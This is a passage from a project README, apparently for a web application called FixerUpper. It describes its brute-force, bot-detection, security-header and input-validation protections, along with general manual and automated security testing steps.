   - Example: Alert when 10+ failed attempts from same IP

5. **IP-based Blocking**:
   - Blocks IP addresses with excessive failed attempts
   - Temporary blocks that expire over time
   - Example: Block IP for 24 hours after 20 failed attempts

6. **CAPTCHA Integration**:
   - Requires CAPTCHA after failed attempts
   - Prevents automated brute force attacks
   - Example: CAPTCHA required after 3 failed attempts

**Testing Procedures**:
1. Attempt multiple failed login attempts (test with 10+ failed attempts)
2. Test progressive delay mechanisms (verify increasing delays)
3. Try to bypass attempt limits (test with different IPs, user agents)
4. Test with various brute force techniques (automated tools, manual attempts)

**Files**: `src/utils/security/rateLimiting/bruteForceProtection.js`

### Bot Detection

**Threat Description**: Bot attacks use automated scripts to perform malicious activities like scraping, spamming, or conducting attacks at scale.

**Potential Impact**:
- Resource exhaustion
- Data scraping
- Spam generation
- Automated attacks
- Performance degradation

**Implemented Protection**:
- User agent analysis
- Behavioral pattern detection
- CAPTCHA challenges
- Fingerprinting techniques
- Request pattern analysis

**Testing Procedures**:
1. Test with automated tools and scripts
2. Attempt to bypass bot detection
3. Test behavioral analysis
4. Try various bot simulation techniques

**Files**: `src/utils/security/rateLimiting/botDetection/`

### Security Headers

**Threat Description**: Missing or misconfigured security headers can expose applications to various attacks and vulnerabilities.

**Potential Impact**:
- XSS vulnerabilities
- Clickjacking attacks
- MIME type confusion
- Information disclosure

**Implemented Protection**:
- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security
- Referrer-Policy

**Testing Procedures**:
1. Check HTTP response headers
2. Test CSP violations
3. Verify header configurations
4. Test with security header scanners

**Files**: `src/utils/security/rateLimiting/securityHeaders.js`

### Input Validation and Sanitization

**Threat Description**: Insufficient input validation allows malicious data to enter the application, leading to various security vulnerabilities.

**Potential Impact**:
- Code injection
- Data corruption
- Logic bypass
- Information disclosure

**Implemented Protection**:
- Joi schema validation
- Input sanitization
- Type checking
- Length validation
- Pattern matching

**Testing Procedures**:
1. Test with invalid input types
2. Attempt to bypass validation
3. Test with malicious patterns
4. Verify sanitization effectiveness

**Files**: `src/utils/validation/`, `src/utils/security/sanitize*.js`

## Use Cases

### User Authentication Flow
```
User Registration → Input Validation → Sanitization → Database Storage → Session Creation
```

### Product Management Flow
```
Admin Login → Product Creation → File Upload Validation → Security Checks → Database Storage
```

### Order Processing Flow
```
User Login → Cart Management → Order Placement → Payment Processing → Order Confirmation
```

### Security Monitoring Flow
```
Request Reception → Security Checks → Threat Detection → Response Generation → Logging
```

## Testing Security

### Manual Testing

1. **SQL Injection Testing**
   - Use tools like SQLMap or manual payload injection
   - Test all input fields with malicious SQL code
   - Verify database remains secure

2. **XSS Testing**
   - Inject script tags in all input fields
   - Test with various XSS payloads
   - Verify output encoding

3. **CSRF Testing**
   - Create malicious forms targeting authenticated users
   - Test cross-origin requests
   - Verify CSRF token validation

4. **Upload Security Testing**
   - Attempt to upload executable files
   - Test with malicious file content
   - Verify quarantine mechanisms

### Automated Testing

1. **Run Security Tests**
   ```bash
   npm test
   ```

2. **Security Linting**
   ```bash
   npm run lint
   ```

3. **Dependency Vulnerability Scan**
   ```bash
   npm audit
   ```

### Security Monitoring

The application includes comprehensive logging and monitoring for:
- Failed authentication attempts
- Suspicious request patterns
- Security violations
- Performance metrics
- Error tracking

### Best Practices

1. **Regular Updates**: Keep dependencies updated
2. **Security Audits**: Regular security assessments
3. **Monitoring**: Continuous security monitoring
4. **Training**: Security awareness training
5. **Documentation**: Maintain security documentation

---

This README provides a comprehensive overview of the FixerUpper project, its security implementations, and testing procedures. For detailed implementation code, refer to the respective files in the `src/utils/security/` directory.